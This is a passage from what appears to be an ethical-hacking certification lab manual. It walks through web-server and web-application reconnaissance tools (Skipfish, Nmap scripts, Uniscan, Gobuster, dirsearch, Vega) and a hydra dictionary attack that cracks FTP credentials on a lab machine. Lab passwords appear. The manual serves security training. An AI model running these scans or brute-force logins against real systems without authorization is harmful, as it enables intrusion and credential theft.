Similarly, you can use the other tools available with Ghost Eye such as Nmap port scan, HTTP header grabber, link grabber, and Robots.txt scanner to gather information about the target web server.

This concludes the demonstration of how to gather information about a target web server using Ghost Eye.

Close all open windows on the Parrot Security machine.

========
Task 2: Perform Web Server Reconnaissance using Skipfish
========

Skipfish is an active web application (deployed on a webserver) security reconnaissance tool. It prepares an interactive sitemap for the targeted site by carrying out a recursive crawl and dictionary-based probes. The resulting map is then annotated with the output from a number of active (but hopefully non-disruptive) security checks. The final report generated by the tool is meant to serve as a foundation for professional web application security assessments.

Click Windows Server 2022 to switch to the Windows Server 2022 machine.

Screenshot

Click Ctrl+Alt+Delete to activate the machine. By default, CEH\Administrator user profile is selected, click Pa$$w0rd to paste the password in the Password field and press Enter to login.

Alternatively, you can also click Pa$$w0rd under Windows Server 2022 machine thumbnail in the Resources pane or Click Type Text | Type Password button under Commands (thunder icon) menu.

Screenshot

Click Type here to search field and type wamp. Wamperserver64 appears in the result, press Enter to launch it.

Screenshot

Wait until the WAMP Server icon turns Green in the Notification area. Leave the Windows Server 2022 machine running.

Screenshot

Click Parrot Security to switch to the Parrot Security machine.

Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Screenshot

Now, perform security reconnaissance on a web server using Skipfish. The target is the WordPress website http://[IP Address of Windows Server 2022].

Specify the output directory and load a dictionary file based on the web server’s requirement. In this lab, we are naming the output directory test.

In the terminal window, type skipfish -o /home/attacker/test -S /usr/share/skipfish/dictionaries/complete.wl http://[IP Address of Windows Server 2022]:8080 and press Enter.

Screenshot

On receiving this command, Skipfish performs a heavy brute-force attack on the web server by using the complete.wl dictionary file, creates a directory named test in the root location, and stores the result in index.html inside this location.

Before beginning a scan, Skipfish displays some tips. Press Enter to start the security reconnaissance.

Screenshot

Skipfish scans the web server, as shown in the screenshot.

Screenshot

Let the Skipfish run the scan for 5 minutes and after that press Ctrl+C to terminate the scan.

Screenshot

On completion of the scan, Skipfish generates a report and stores it in the test directory (in the /home/attacker/ location). Click Places from the top-section of the Desktop and click Home Folder from the drop-down options.

Screenshot

The attacker window appears, double-click test folder.

Screenshot

Right-click index.html, hover your mouse cursor on Open With, and click Firefox to view the scan result.

Screenshot

The Skipfish crawl result appears in the web browser, displaying a summary overview of document and issue types found, as shown in the screenshot.

Screenshot

Expand each node to view detailed information regarding the result.

Analyze an issue found in the web server. To do this, click a node under the Issue type overview section to expand it.

Analyze the SQL query or similar syntax in parameters issue.

Screenshot

Observe the URL of the webpage associated with the vulnerability. Click the URL.

Screenshot

The webpage appears, as shown in the screenshot.

Screenshot

The PHP version webpage appears, displaying details related to the machine, as well as the other resources associated with the web server infrastructure and PHP configuration.

Switch back to the first tab and click show trace next to the URL to examine the vulnerability in detail.

Screenshot

An HTTP trace window appears on the webpage, displaying the complete HTML session, as shown in the screenshot.

If the window does not properly appear, hold down the Ctrl key and click the link.

Screenshot

Examine other vulnerabilities and patch them to secure the web server.

This concludes the demonstration of how to gather information about a target web server using Skipfish.

Close all open windows on both the Parrot Security and Windows Server 2022 machines.

========
Task 3: Footprint a Web Server using the httprecon Tool
========

Here, we will use the httprecon tool to gather information about a target web server.

Click Windows 11 to switch to the Windows 11, click Ctrl+Alt+Delete.

Alternatively, you can also click Ctrl+Alt+Delete button under Windows 11 machine thumbnail in the Resources pane or Click Ctrl+Alt+Delete button under Commands (thunder icon) menu.

By default, Admin user profile is selected, click Pa$$w0rd to paste the password in the Password field and press Enter to login.

Alternatively, you can also click Pa$$w0rd under Windows 11 machine thumbnail in the Resources pane or Click Type Text | Type Password button under Commands (thunder icon) menu.

Networks screen appears, click Yes to allow your PC to be discoverable by other PCs and devices on the network.

Screenshot

Navigate to E:\CEH-Tools\CEHv12 Module 13 Hacking Web Servers\Web Server Footprinting Tools\httprecon, right-click httprecon.exe, and, from the context menu, click Run as administrator double-click to launch the application.

If a User Account Control pop-up appears, click Yes.

Main window of httprecon appears, enter the website URL (here, www.certifiedhacker.com) that you want to footprint and select port number (80) in the Target section.

Screenshot

Click Analyze to start analyzing the designated website.

A footprint of the website appears, as shown in the screenshot.

Screenshot

Look at the Get existing tab, and observe the server (nginx) used to develop the webpages.

When attackers obtain this information, they research the vulnerabilities present in nginx and try to exploit them, which results in either full or partial control over the web application.

Click the GET long request tab, which lists all GET requests. Next, click the Fingerprint Details tab.

2022-04-18_17-13-35.png

The details displayed in the screenshot above include the name of the protocol the website is using and its version.

By obtaining this information, attackers can manipulate HTTP vulnerabilities in order to perform malicious activities such as sniffing over the HTTP channel, which might result in revealing sensitive data such as user credentials.

This concludes the demonstration of how to gather information about the target web server using httprecon.

Close all open windows on the Windows 11 machine.

========
Task 4: Footprint a Web Server using ID Serve
========

ID Serve is a simple Internet server identification utility. Following is a list of its capabilities:

HTTP server identification

Non-HTTP server identification

Reverse DNS lookup

Click Windows 11 to switch to the Windows 11 machine, navigate to E:\CEH-Tools\CEHv12 Module 13 Hacking Web Servers\Web Server Footprinting Tools\ID Serve and double-click idserve.exe.

The main window of ID Serve appears. By default, the Server Query tab appears.

Screenshot

For option 1, in the Enter or copy/paste an Internet server URL or IP address section, enter the URL (http://www.certifiedhacker.com) you want to footprint.

Click Query the Server to start querying the website.

After the completion of the query, ID Serve displays the results of the entered website, as shown in the screenshot.

Screenshot

After obtaining this information, the attacker may perform a vulnerability analysis on that particular version of the web server and implement various techniques to perform exploitation.

Click Exit to close the application. Close all open windows.

========
Task 5: Footprint a Web Server using Netcat and Telnet
========

Netcat

Netcat is a networking utility that reads and writes data across network connections, using the TCP/IP protocol. It is a reliable “back-end” tool used directly or driven by other programs and scripts. It is also a network debugging and exploration tool.

Telnet

Telnet is a client-server network protocol. It is widely used on the Internet or LANs. It provides the login session for a user on the Internet. The single terminal attached to another computer emulates with Telnet. The primary security problems with Telnet are the following:

It does not encrypt any data sent through the connection.

It lacks an authentication scheme.

Telnet helps users perform banner-grabbing attacks. It probes HTTP servers to determine the Server field in the HTTP response header.

Click Parrot Security to switch to the Parrot Security machine.

Click the MATE Terminal icon from the menu bar to launch the terminal.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

In the terminal window, type nc -vv www.moviescope.com 80 and press Enter.

Screenshot

Once you hit Enter, the netcat will display the hosting information of the provided domain, as shown in the screenshot.

Now, type GET / HTTP/1.0 and press Enter twice.

Netcat will perform the banner grabbing and gather information such as content type, last modified date, accept ranges, ETag, and server information.

Screenshot

In the terminal windows, type clear and press Enter to clear the netcat result in the terminal window.

Screenshot

Now, perform banner grabbing using telnet. In the terminal window, type telnet www.moviescope.com 80 and press Enter.

Screenshot

Telnet will connect to the domain, as shown in the screenshot.

Now, type GET / HTTP/1.0 and press Enter twice. Telnet will perform the banner grabbing and gather information such as content type, last modified date, accept ranges, ETag, and server information.

Screenshot

This concludes the demonstration of how to gather information about the target web server using the Netcat and Telnet utilities.

Close the terminal window on the Parrot Security machine.

========
Task 6: Enumerate Web Server Information using Nmap Scripting Engine (NSE)
========

Nmap, along with Nmap Scripting Engine, can extract a lot of valuable information from the target web server. In addition to Nmap commands, Nmap Scripting Engine (NSE)provides scripts that reveal various useful information about the target web server to an attacker.

On to the Parrot Security machine, click the MATE Terminal icon from the menu bar to launch the terminal.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Screenshot

Enumerate the directories used by web servers and web applications, in the terminal window. Type nmap -sV --script=http-enum [target website] and press Enter.

In this scan, we are enumerating the www.goodshopping.com website.

Screenshot

This script enumerates and provides you with the output details, as shown in the screenshot.

Screenshot

The next step is to discover the hostnames that resolve the targeted domain.

In the terminal window, type nmap --script hostmap-bfk -script-args hostmap-bfk.prefix=hostmap- www.goodshopping.com and press Enter.

Screenshot

Perform an HTTP trace on the targeted domain. In the terminal window, type nmap --script http-trace -d www.goodshopping.com and press Enter.

This script will detect a vulnerable server that uses the TRACE method by sending an HTTP TRACE request that shows if the method is enabled or not.

Screenshot

Screenshot

Screenshot

Now, check whether Web Application Firewall is configured on the target host or domain. In the terminal window, type nmap -p80 --script http-waf-detect www.goodshopping.com and press Enter.

This command will scan the host and attempt to determine whether a web server is being monitored by an IPS, IDS, or WAF.

This command will probe the target host with malicious payloads and detect the changes in the response code.

Screenshot

This concludes the demonstration of how to enumerate web server information using the Nmap Scripting Engine (NSE).

Close the terminal windows on the Parrot Security machine.

========
Task 7: Uniscan Web Server Fingerprinting in Parrot Security
========

Uniscan is a versatile server fingerprinting tool that not only performs simple commands like ping, traceroute, and nslookup, but also does static, dynamic, and stress checks on a web server. Apart from scanning websites, uniscan also performs automated Bing and Google searches on provided IPs. Uniscan takes all of this data and combines them into a comprehensive report file for the user.

Click Windows Server 2022 to switch to the Windows Server 2022 machine.

Screenshot

Click Ctrl+Alt+Delete to activate the machine. By default, CEH\Administrator user profile is selected, click Pa$$w0rd to paste the password in the Password field and press Enter to login.

Alternatively, you can also click Pa$$w0rd under Windows Server 2022 machine thumbnail in the Resources pane or Click Type Text | Type Password button under Commands (thunder icon) menu.

Screenshot

Click Type here to search field and type wamp. Wamperserver64 appears in the result, press Enter to launch it.

Screenshot

Wait until the WAMP Server icon turns Green in the Notification area. Leave the Windows Server 2022 machine running.

Screenshot

Leave the Windows Server 2022 machine running and switch to the Parrot Security machine.

Now, click Parrot Security to switch to the Parrot Security machine, click the MATE Terminal icon from the menu bar to launch the terminal.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Screenshot

In the terminal window, type uniscan -h and hit Enter to display the uniscan help options.

The help menu appears, as shown in the screenshot. First, use the -q command to search for the directories of the web server.

Screenshot

In the terminal window, type uniscan -u http://10.10.1.22:8080/CEH -q and hit Enter to start scanning for directories.

Here, 10.10.1.22 is the IP address of the Windows Server 2022 machine. This may vary in your lab environment.

In the above command, the -u switch is used to provide the target URL, and the -q switch is used to scan the directories in the web server.

Screenshot

Uniscan starts performing different tests on the webserver and discovering web directories, as shown in the screenshot.

Analyze the complete output of the scan. It should take approximately 5 minutes for the scan to finish.

Screenshot

Now, run uniscan using two options together. Here -w and -e are used together to enable the file check (robots.txt and sitemap.xml file). In the terminal window, type uniscan -u http://10.10.1.22:8080/CEH -we and hit Enter to start the scan.

Screenshot

Uniscan starts the file check and displays the results, as shown in the screenshot.

Scroll to analyze the complete scan result. It should take approximately 5 minutes for the scan to finish.

Screenshot

Now, use the dynamic testing option by giving the command -d. Type uniscan -u http://10.10.1.22:8080/CEH -d and hit Enter to start a dynamic scan on the web server.

Screenshot

Uniscan starts performing dynamic tests, obtaining more information about email-IDs, Source code disclosures, and external hosts, web backdoors, dynamic tests.

Scroll to analyze the complete output of the scan. It should take approximately 18 minutes for the scan to finish.

Screenshot

Screenshot

Screenshot

Click Places from the top-section of the Desktop and click Home Folder from the drop-down options.

Screenshot

Click File System from the left-pane and click usr --> share --> uniscan --> report.

Screenshot

Right-click on 10.10.1.22.html. Hover your mouse cursor on Open With and click Firefox from the menu to view the scan report.

Screenshot

The report opens in the browser, giving you all scan details in a more comprehensive manner. Here, you can further analyze the report in depth.

Screenshot

This concludes the demonstration of how to gather information about the target web server using Uniscan.

Close all terminal windows on the Parrot Security machine.

########
Lab 2: Perform a Web Server Attack
########

========
Task 1: Crack FTP Credentials using a Dictionary Attack (hydra)
========

A dictionary or wordlist contains thousands of words that are used by password cracking tools to break into a password-protected system. An attacker may either manually crack a password by guessing it or use automated tools and techniques such as the dictionary method. Most password cracking techniques are successful, because of weak or easily guessable passwords.

First, find the open FTP port using Nmap, and then perform a dictionary attack using the THC Hydra tool.

Click Parrot Security to switch to the Parrot Security machine.

Here, we will use a sample password file (Passwords.txt) containing a list of passwords to crack the FTP credentials on the target machine.

Assume that you are an attacker, and you have observed that the FTP service is running on the Windows 11 machine.

Perform an Nmap scan on the target machine (Windows 11) to check if the FTP port is open.

Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Screenshot

In the terminal window, type nmap -p 21 [IP Address of Windows 11], and press Enter.

Here, the IP address of Windows 11 is 10.10.1.11.

Screenshot

Observe that port 21 is open in Windows 11.

Check if an FTP server is hosted on the Windows 11 machine.

Type ftp [IP Address of Windows 11] and press Enter. You will be prompted to enter user credentials. The need for credentials implies that an FTP server is hosted on the machine.

Screenshot

Try entering random usernames and passwords in an attempt to gain FTP access.

The password you enter will not be visible on the screen.

As shown in the screenshot, you will not be able to log in to the FTP server. Close the terminal window.

Screenshot

Now, to attempt to gain access to the FTP server, perform a dictionary attack using the THC Hydra tool.

Click Places from the top-section of the Desktop and click Desktop from the drop-down options.

Screenshot

Navigate to CEHv12 Module 13 Hacking Web Servers folder and copy Wordlists folder.

Press Ctrl+C to copy the folder.

Screenshot

Paste the copied folder (Wordlists) on the Desktop. Close the window

Press Ctrl+V to paste the folder.

Screenshot

Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

In the terminal window, type hydra -L /home/attacker/Desktop/Wordlists/Usernames.txt -P /home/attacker/Desktop/Wordlists/Passwords.txt ftp://[IP Address of Windows 11] and press Enter.

The IP address of Windows 11 in this lab exercise is 10.10.1.11. This IP address might vary in your lab environment.

Screenshot

Hydra tries various combinations of usernames and passwords (present in the Usernames.txt and Passwords.txt files) on the FTP server and outputs cracked usernames and passwords, as shown in the screenshot.

This might take some time to complete.

On completion of the password cracking, the cracked credentials appear, as shown in the screenshot.

2022-04-19_11-51-13.png

Try to log in to the FTP server using one of the cracked username and password combinations. In this lab, use Martin’s credentials to gain access to the server.

In the terminal window, type ftp [IP Address of Windows 11], and press Enter.

Enter Martin’s user credentials (Martin and apple) to check whether you can successfully log in to the server.

On entering the credentials, you will successfully be able to log in to the server. An ftp terminal appears, as shown in the screenshot.

Screenshot

Now you can remotely access the FTP server hosted on the Windows 11 machine.

Type mkdir Hacked and press Enter to remotely create a directory named Hacked on the Windows 11 machine through the ftp terminal.

Screenshot

Click Windows 11 to switch to the Windows 11 machine and navigate to C:\FTP.

View the directory named Hacked, as shown in the screenshot:

Screenshot

You have successfully gained remote access to the FTP server by obtaining the appropriate credentials.

Click Parrot Security to switch back to the Parrot Security machine.

Enter help to view all other commands that you can use through the FTP terminal.

Screenshot

On completing the task, enter quit to exit the ftp terminal.

Screenshot

This concludes the demonstration of how to crack FTP credentials using a dictionary attack and gain remote access to the FTP server.

Close all open windows on both the Parrot Security and Windows 11 machines.

########
Module 14 - Hacking Web Applications
########

########
Lab 1 - Footprint the Web Infrastructure
########

========
Task 1: Perform Web Application Reconnaissance using Nmap and Telnet
========

In this task, we will perform web application reconnaissance to gather information about server IP address, DNS names, location and type of server, open ports and services, make, model, version of the web server software, and server-side technology.

In this task, the target website (www.moviescope.com) is hosted by the victim machine (Windows Server 2019). Here, the host machine is the Parrot Security machine.

Click Parrot Security to switch to the Parrot Security machine.

Screenshot

In the login page, the attacker username will be selected by default. Enter password as toor in the Password field and press Enter to log in to the machine.

Screenshot

Perform a Whois lookup to gather information about the IP address of the web server and the complete information about the domain such as its registration details, name servers, IP address, and location.

Use tools such as Netcraft (https://www.netcraft.com), SmartWhois (https://www.tamos.com), WHOIS Lookup (https://whois.domaintools.com), and Batch IP Converter (http://www.sabsoft.com) to perform the Whois lookup.

Perform DNS Interrogation to gather information about the DNS servers, DNS records, and types of servers used by the target organization. DNS zone data include DNS domain names, computer names, IP addresses, domain mail servers, service records, etc.

Use tools such as, DNSRecon (https://github.com), and DNS Records (https://network-tools.com), Domain Dossier (https://centralops.net) to perform DNS interrogation.

Now, we will perform port scanning to gather information about the open ports and services running on the machine hosting the target website.

Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

If a Question pop-up window appears, asking for you to update the machine, click No to close the window.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Now, type cd and press Enter to jump to the root directory.

Screenshot

In the Parrot Terminal window, type nmap -T4 -A -v [Target Web Application] (here, the target web application is www.moviescope.com) and press Enter to perform a port and service discovery scan.

In this command, -T4: specifies setting time template (0-5), -A: specifies aggressive scan, and -v: enables the verbose output (include all hosts and ports in the output).

The result appears, displaying the open ports and services running on the machine hosting the target website.

Screenshot

Screenshot

Scroll down to see the complete results. You can observe that the target machine name, NetBIOS name, DNS name, MAC address, OS, and other information is displayed, as shown in the screenshot.

Screenshot

Screenshot

Now, perform banner grabbing to identify the make, model, and version of the target web server software.

In the terminal window, type telnet www.moviescope.com 80 and press Enter to establish a telnet connection with the target machine.

Port 80 is the port number assigned to the commonly used Internet communication protocol, Hypertext Transfer Protocol (HTTP).

The Trying 10.10.1.19… message appears; type GET / HTTP/1.0 and press Enter two times.

Screenshot

The result appears, displaying information related to the server name and its version, technology used.

Here, the server is identified as Microsoft-IIS/10.0 and the technology used is ASP.NET.

In real-time, an attacker can specify either the IP address of a target machine or the URL of a website. In both cases, the attacker obtains the banner information of the respective target. In other words, if the attacker entered an IP address, they receive the banner information of the target machine; if they enter the URL of a website, they receive the banner information of the respective web server that hosts the website.

Screenshot

This concludes the demonstration of how to perform web application reconnaissance (Whois lookup, DNS interrogation, port and services discovery, banner grabbing, and firewall detection).

Close all open windows and document all acquired information.

========
Task 2: Perform Web Application Reconnaissance using WhatWeb
========

WhatWeb identifies websites and recognizes web technologies, including content management systems (CMS), blogging platforms, statistics and analytics packages, JavaScript libraries, web servers, and embedded devices. It also identifies version numbers, email addresses, account IDs, web framework modules, SQL errors, and more.

Here, we will perform web application reconnaissance using the WhatWeb tool.

In this task, the target website (www.moviescope.com) is hosted by the victim machine (Windows Server 2019). Here, the host machine is the Parrot Security machine.

Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Now, type cd and press Enter to jump to the root directory.

Screenshot

In the Terminal window, type whatweb and press Enter. It displays a list of the commands available with WhatWeb.

Screenshot

Now, type whatweb [Target Web Application] (here, the target web application is www.moviescope.com) and press Enter to perform website footprinting on the target website.

The result appears, displaying the MovieScope website infrastructure, as shown in the screenshot.

Screenshot

In the terminal, type whatweb -v [Target Web Application] (here, the target web application is www.moviescope.com) and press Enter to run a verbosity scan on the target website.

The result appears, displaying a detailed report on the target website such as its IP address, plugin information, and HTTP header information, as shown in the screenshot.

Screenshot

Screenshot

Screenshot

Now, type whatweb --log-verbose=MovieScope_Report www.moviescope.com and press Enter to export the results returned by WhatWeb as a text file.

This will generate a report with the name MovieScope_Report and save this file in the root folder.

Screenshot

Type, pluma MovieScope_Report and press Enter to open the file.

Screenshot

The MovieScope_Report text file appears, as shown in the screenshot.

In real-time, attackers use this information to determine the website infrastructure and find underlying vulnerabilities, and later exploit them to launch further attacks.

Screenshot

This concludes the demonstration of how to perform website reconnaissance on a target website using the WhatWeb tool.

Close all open windows and document all acquired information.


========
Task 3: Perform Web Spidering using OWASP ZAP
========

OWASP Zed Attack Proxy (ZAP) is an integrated penetration testing tool for finding vulnerabilities in web applications. It offers automated scanners as well as a set of tools that allow you to find security vulnerabilities manually. ZAP provides functionality for a range of skill levels—from developers to testers new to security testing, to security testing specialists.

Here, we will perform web spidering on the target website using OWASP ZAP.

In this task, the target website (www.moviescope.com) is hosted by the victim machine (Windows Server 2019). Here, the host machine is the Parrot Security machine.

Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Now, type cd and press Enter to jump to the root directory.

Screenshot

In the Terminal window, type zaproxy and press Enter to launch OWASP ZAP.

Screenshot

The OWASP ZAP initializing window appears; wait for it to complete.

After completing initialization, a prompt that reads Do you want to persist the ZAP Session? appears; select the No, I do not want to persist this session at this moment in time radio button and click Start.

If a Manage Add-ons window appears, click the Close button.

Screenshot

The OWASP ZAP main window appears. Under the Quick Start tab, click the Automated Scan option under Welcome to OWASP ZAP.

Screenshot

The Automated Scan wizard appears; enter the target website under the URL to attack field (here, www.moviescope.com). Leave the other settings to default and click the Attack button.

Screenshot

OWASP ZAP starts scanning the target website. You can observe various URLs under the Spider tab.

Screenshot

After performing web spidering, OWASP ZAP performs active scanning. Navigate to the Active Scan tab to observe the various scanned links.

Screenshot

After completing the active scan, the results appear under the Alerts tab, displaying the various vulnerabilities and issues associated with the target website, as shown in the screenshot.

In this task, the objective being web spidering, we will focus on the information obtained while performing web spidering.

Screenshot

Now, click on the Spider tab from the lower section of the window to view the web spidering information. By default, the URLs tab appears under the Spider tab.

The URLs tab contains various links for hidden content and functionality associated with the target website (www.moviescope.com).

Screenshot

Now, navigate to the Messages tab under the Spider tab to view more detailed information regarding the URLs obtained while performing the web spidering, as shown in the screenshot.

In real-time, attackers perform web spidering or crawling to discover hidden content and functionality, which is not reachable from the main visible content, to exploit user privileges within the application. It also allows attackers to recover backup copies of live files, configuration and log files containing sensitive data, backup archives containing snapshots of files within the web root, and new functionality that is not linked to the main application.

Screenshot

This concludes the demonstration of how to perform web spidering on a target website using OWASP ZAP.

Close all open windows and document all acquired information.

========
Task 4: Detect Load Balancers using Various Tools
========

Organizations use load balancers to distribute web server load over multiple servers and increase the productivity and reliability of web applications. Generally, there are two types of load balancers, namely, DNS load balancers (Layer 4 load balancers) and http load balancers (layer 7 load balancers). You can use various tools such as dig and load balancing detector (lbd) to detect the load balancers of the target organization along with their real IP addresses.

Here, we will detect load balancers using dig command and lbd tool.

In this task, we will detect the load balancers on the website www.yahoo.com, as the websites hosted by our lab environment do not use load balancers. However, you can select a target of your own choice.

Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Now, type cd and press Enter to jump to the root directory.

Screenshot

A Parrot Terminal window appears; type dig yahoo.com and press Enter.

Screenshot

The result appears, displaying the available load balancers of the target website, as the screenshot demonstrates. Here, a single host resolves to multiple IP addresses, which possibly indicates that the host is using a load balancer.

dig command provides detailed results and is used to identify whether the target domain is resolving to multiple IP addresses.

Screenshot

Now, type lbd yahoo.com and press Enter.

The result appears, displaying the available DNS load balancers used by the target website, as shown in the screenshot.

lbd (load balancing detector) detects if a given domain uses DNS and http load balancing via the Server: and Date: headers and the differences between server answers. It analyzes the data received from application responses to detect load balancers.

Screenshot

This concludes the demonstration of how to detect load balancers using dig command and lbd tool.

Close all open windows and document all acquired information.

========
Task 5: Identify Web Server Directories using Various Tools
========

Here, we will use Nmap, Gobuster and Dirsearch tools to identify web server directories on the target website.

In this task, the target website (www.moviescope.com) is hosted by the victim machine (Windows Server 2019). Here, the host machine is the Parrot Security machine.

Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Now, type cd and press Enter to jump to the root directory.

Screenshot

A Parrot Terminal window appears; type nmap -sV --script=http-enum [target domain or IP address] (here, the target website is www.moviescope.com) and press Enter.

The result appears, displaying open ports and services, along with their version.

Scroll-down in the result and observe the identified web server directories under the http-enum section, as shown in the screenshot.

In real-time, attackers use various techniques to detect the vulnerabilities in the target web applications hosted by the web servers either to gain administrator-level access to the server or to retrieve sensitive information stored on the server. Attackers use the Nmap NSE script http-enum to enumerate the applications, directories, and files of the web servers that are exposed on the Internet. Through this method, attackers identify critical security vulnerabilities on the target web application.

more...
Screenshot

Now, we shall copy the wordlist file (common.txt) from a shared network drive. We will use this file in the Gobuster tool.

Minimize the Terminal window.

Click Places from the top-section of the Desktop and click Desktop from the drop-down options.

Screenshot

Navigate to CEHv12 Module 14 Hacking Web Applications folder and copy common.txt file.

Press Ctrl+C to copy the file.

Screenshot

Paste the copied file (common.txt) on the Desktop. Close the window.

Press Ctrl+V to paste the file.

Screenshot

Now, switch back to the Terminal window, type gobuster dir -u [Target Website] -w /home/attacker/Desktop/common.txt, and press Enter.

dir: uses the directory or file brute-forcing mode, -u: specifies the target URL (here, www.moviescope.com), and -w: specifies the wordlist file used for directory brute-forcing (here, common.txt).

Screenshot

The result appears, displaying the identified web server directories, as shown in the screenshot.

In real-time, attackers use Gobuster to scan the target website for web server directories and perform fast-paced enumeration of the hidden files and directories of the target web application. Gobuster is a command-oriented tool used to brute-force URIs in websites, DNS subdomains, and names of the virtual hosts on the target server.

Screenshot

Now, click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Screenshot

Navigate to the dirsearch directory to do that, type cd dirsearch/ and press Enter.

Screenshot

Type python3 dirsearch.py -u http://www.moviescope.com and press Enter, to start directory brute forcing.

-u: specifies target URL.

Screenshot

dirsearch starts listing all the directories of the target website.

Screenshot

Now, we will perform directory bruteforcing on a specific file extension.

Type python3 dirsearch.py -u http://www.moviescope.com -e aspx and press Enter.

-u: specifies URL and –e: specifies extension of the file.

Screenshot

dirsearch lists all the files containing aspx extension, as shown in the screenshot.

Screenshot

Now, we will perform directory bruteforcing by excluding the status code 403.

In the terminal, type python3 dirsearch.py -u http://www.moviescope.com -x 403 and press Enter.

-x: specifies exclude status code.

Screenshot

dirsearch lists the directories from the target website excluding 403 status code.

Screenshot

This concludes the demonstration of identifying web server directories using Nmap and Gobuster.

Close all open windows and document all acquired information.

========
Task 6: Perform Web Application Vulnerability Scanning using Vega
========

Vega is a web application scanner used to test the security of web applications. It helps you to find and validate SQL Injection, XSS, inadvertently disclosed sensitive information, and other vulnerabilities.

Here, we will discover vulnerabilities in the target web application using Vega.

In this task, the target website (http://10.10.1.22:8080/dvwa) is hosted by the victim machine (Windows Server 2022). Here, the host machine is the Windows 11 machine.

Click Windows Server 2022 to switch to the Windows Server 2022 machine Click Ctrl+Alt+Delete to activate the machine, by default, CEH\Administrator account is selected, type Pa$$w0rd in the Password field and press Enter.

Screenshot

Now, in the left corner of Desktop, click Type here to search field, type wampserver64 and press Enter to select Wampserver64 from the results.

Screenshot

Click the Show hidden icons icon, observe that the WampServer icon appears.

Wait for this icon to turn green, which indicates that the WampServer is successfully running.

Screenshot

Click Windows 11 to switch to the Windows 11 machine, click Ctrl+Alt+Delete to activate the machine.

Alternatively, you can also click Ctrl+Alt+Delete button under Windows 11 machine thumbnail in the Resources pane or Click Ctrl+Alt+Delete button under Commands (thunder icon) menu.

By default, Admin user profile is selected, click Pa$$w0rd to paste the password in the Password field and press Enter to login.

Alternatively, you can also click Pa$$w0rd under Windows 11 machine thumbnail in the Resources pane or Click Type Text | Type Password button under Commands (thunder icon) menu.

Networks screen appears, click Yes to allow your PC to be discoverable by other PCs and devices on the network.

Screenshot

Click Search icon ( search14icon.jpg) on the Desktop. Type vega in the search field, the Vega appears in the results, click Run as administrator to launch it.

Screenshot

The Subgraph Vega main window appears, as shown in the screenshot.

Screenshot

Click Scan from the menu bar and select Start New Scan from the available options.

Screenshot

The Select a Scan Target window appears on the screen. Ensure that the Enter a base URI for scan radio button is selected under the Scan Target section.

In the Enter a base URI for scan field, enter the target URL as http://10.10.1.22:8080/dvwa and click Next.

10.10.1.22 is the IP address of Windows Server 2022, where the DVWA site is hosted on port 8080.

Screenshot

The Select Modules wizard appears; double-click on both of the checkboxes (Injection Modules and Response Processing Modules) to select all options.

By checking these options, all modules under these options will be selected. Click Next.

bzgbqop.jpg

In the Authentication Options wizard, leave the settings to default and click Next.

In Parameters wizard, leave the settings to default and click Finish to initiate the scan.

Screenshot

The Follow Redirect? pop-up appears; click Yes to continue.

Screenshot

The Vega application starts scanning the target website for vulnerabilities. Observe the Scanner Progress bar and wait for it to finish.

In the left-hand pane, under the Scan Alerts section, you can see the scan status as Auditing. As soon as Vega completes, the scan status changes to Completed.

Screenshot

After the scanner finishes performing its vulnerability assessment on the target website, it lists the discovered vulnerabilities under Scan Alert Summary.

Screenshot

In the left-pane under Scan Alerts, expand the nodes to view the complete vulnerability scan result. Now, choose any one of the discovered vulnerabilities to display it on the respective page, as in the dashboard section shown in the screenshot.

Choose any one vulnerability under the Scan Alerts section in the left-hand pane. Here, we are selecting the Cleartext Password over HTTP vulnerability; detailed information regarding the selected vulnerability will be displayed in the right section of the window, as shown in the screenshot.

Screenshot

Similarly, you can select any vulnerability from the list of discovered vulnerabilities to view its detailed information and then apply appropriate fixes for all the vulnerable codes in your web application.

This concludes the demonstration of how to discover vulnerabilities in a target website scanning using Vega.

You can also use other web application vulnerability scanning tools such as WPScan Vulnerability Database (https://wpscan.com), Arachni (https://www.arachni-scanner.com), appspider (https://www.rapid7.com), or Uniscan (https://sourceforge.net) to discover vulnerabilities in the target website.

Close all open windows and document all acquired information.

========
Task 7: Identify Clickjacking Vulnerability using ClickjackPoc
========

